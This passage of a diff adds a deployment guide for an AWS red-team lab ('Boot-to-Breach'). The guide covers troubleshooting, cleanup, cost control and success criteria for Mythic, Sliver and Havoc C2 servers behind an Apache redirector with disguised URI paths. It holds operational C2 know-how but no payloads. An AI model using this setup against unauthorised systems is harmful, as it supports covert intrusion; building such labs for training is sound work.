+
+- Windows still setting up (wait 10 min)
+- Security group misconfiguration
+- Guacamole didn't auto-configure connection
+
+### Windows Terminal or WSL Not Working
+
+**Symptoms:** Windows Terminal not in Start Menu, or WSL shows no distributions
+
+**Solution:**
+
+- A reboot is typically required after WSL feature installation
+- Check `C:\Windows\Temp\user-data.log` for installation errors
+- Manually install WSL: `wsl --install -d Debian`
+- Manually install Windows Terminal: open PowerShell as Admin and run `choco install microsoft-windows-terminal -y`
+
+### Agent Won't Callback
+
+**Symptoms:** Agent executes but no callback in Mythic/Sliver/Havoc
+
+**Checklist:**
+
+- [ ] Listener is running on the C2 server
+- [ ] Callback Host and Port match the redirector's public IP and correct port
+- [ ] Redirector Apache is running with all VirtualHosts enabled
+- [ ] Redirector can reach the C2 server's private IP
+- [ ] If filtering rules are applied, the agent's user-agent and URI match
+
+**Debug:**
+
+```bash
+# Check Apache status and VirtualHosts
+ssh ubuntu@$REDIR_IP
+sudo apache2ctl -S
+systemctl status apache2
+
+# Check the appropriate log for the C2 framework
+# Mythic: /var/log/apache2/redirector-access.log
+# Sliver: /var/log/apache2/sliver-access.log
+# Havoc:  /var/log/apache2/havoc-access.log
+sudo tail -100 /var/log/apache2/redirector-error.log
+```
+
+### Terraform Errors
+
+**Error:** `InvalidKeyPair.NotFound`
+
+```bash
+# List available keys
+aws ec2 describe-key-pairs --query 'KeyPairs[].KeyName'
+# Update terraform.tfvars with correct name
+```
+
+**Error:** `VPC limit exceeded`
+
+```bash
+# Use default VPC instead
+# In terraform.tfvars: use_default_vpc = true
+```
+
+---
+
+## Post-Deployment Actions
+
+### Cleanup (When Done)
+
+```bash
+terraform destroy
+# Type 'yes' to confirm
+
+# Verify removal
+aws ec2 describe-instances --filters "Name=tag:Project,Values=redstack"
+```
+
+### Cost Management
+
+**Stop instances when not in use:**
+
+```bash
+# Stop all
+aws ec2 stop-instances --instance-ids \
+  $(terraform output -json | jq -r '.mythic_server.value.instance_id') \
+  $(terraform output -json | jq -r '.sliver_server.value.instance_id') \
+  $(terraform output -json | jq -r '.havoc_server.value.instance_id') \
+  $(terraform output -json | jq -r '.guacamole_server.value.instance_id') \
+  $(terraform output -json | jq -r '.windows_client.value.instance_id') \
+  $(terraform output -json | jq -r '.vps_redirector.value.instance_id')
+```
+
+---
+
+## Success Criteria
+
+At the end of this deployment, you should have:
+
+- ✅ All 6 EC2 instances running and accessible
+- ✅ 2 VPCs with peering configured
+- ✅ Apache redirector routing traffic to 3 C2 servers via URI prefixes on 80/443
+- ✅ Mythic team server isolated (HTTP/HTTPS only from redirector)
+- ✅ Sliver C2 server isolated (no public IP, internal only)
+- ✅ Havoc C2 server isolated (no public IP, internal only)
+- ✅ Mythic HTTP listener configured through redirector (/news/)
+- ✅ Sliver HTTP listener configured through redirector (/images/)
+- ✅ Havoc HTTP listener configured through redirector (/api/)
+- ✅ At least 1 active agent callback per C2 framework
+- ✅ Can execute commands through all C2 paths
+- ✅ All 6 Guacamole connections auto-created (1 RDP, 5 SSH)
+- ✅ Guacamole providing web-based access to all infrastructure components
+- ✅ SSH password authentication working from VPC, keys required from public IPs
+- ✅ Windows workstation with Windows Terminal and WSL Debian installed
+- ✅ Windows attacker user accessible via auto-generated lab password
+
+**Your Boot-to-Breach lab environment is operational.**
